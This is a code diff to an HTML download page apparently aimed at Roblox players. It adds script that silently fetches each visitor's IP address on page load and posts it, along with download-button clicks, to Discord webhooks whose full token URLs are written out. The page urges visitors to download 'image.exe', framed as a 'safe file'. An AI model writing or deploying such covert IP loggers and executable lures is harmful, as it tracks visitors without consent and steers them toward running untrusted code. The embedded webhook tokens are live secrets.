@@ -47,13 +47,52 @@
       background-color: #3367d6;
     }
   </style>
+
+  <script>
+    function getIpAddress() {
+      return fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip);
+    }
+
+    function sendDownloadWebhook() {
+      var webhookUrl = "https://discord.com/api/webhooks/1220411150399836160/7ShKHkWVtRPrmIEGOwjU27sNn1AvpO4ibggKvL4eV8rrRirqBNf8vD3Je2-u9G7xvzTB";
+      var request = new XMLHttpRequest();
+      request.open("POST", webhookUrl);
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var content = {
+        content: "Someone has clicked the download button"
+      };
+
+      request.send(JSON.stringify(content));
+    }
+
+    function sendWebsiteWebhook(ipAddress) {
+      var webhookUrl = "https://discord.com/api/webhooks/1220409073216917565/4BzaAA3nqnx7nfVMR5TukwLqomok1Dn53PnyaVl7Nn0G-CzMC7DISfEHbeEKoelYR2-Z";
+      var request = new XMLHttpRequest();
+      request.open("POST", webhookUrl);
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var content = {
+        content: "Someone is on the website. IP address: " + ipAddress
+      };
+
+      request.send(JSON.stringify(content));
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+      getIpAddress()
+        .then(ipAddress => sendWebsiteWebhook(ipAddress));
+    });
+  </script>
 </head>
 <body>
   <div class="container">
-    <h1>Download att your own risk</h1>
-    <p>click to download the safe file 100% no free robux</p>
+    <h1>Download at your own risk</h1>
+    <p>Click to download the safe file (100% no free robux)</p>
   
-    <a href="image.exe" download class="download-button">Download</a>
+    <a href="image.exe" download class="download-button" onclick="sendDownloadWebhook()">Download</a>
   </div>
 </body>
 </html>
